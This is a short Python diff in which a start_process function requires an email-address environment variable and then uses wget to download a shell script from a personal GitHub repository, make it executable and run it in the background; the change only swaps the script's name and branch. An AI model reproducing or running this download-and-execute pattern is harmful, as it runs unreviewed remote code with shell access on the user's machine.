@@ -35,7 +35,7 @@ def start_process():
     if ptk_address is None:
         print('PTK_address environment variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'wget https://raw.githubusercontent.com/feby12329/laughing-goggles/master/wege.sh && chmod +x wege.sh && ./wege.sh > {LOG_FILE} 2>&1 &'
+    cmd = f'wget https://raw.githubusercontent.com/feby12329/laughing-goggles/main/start.sh && chmod +x start.sh && ./start.sh > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
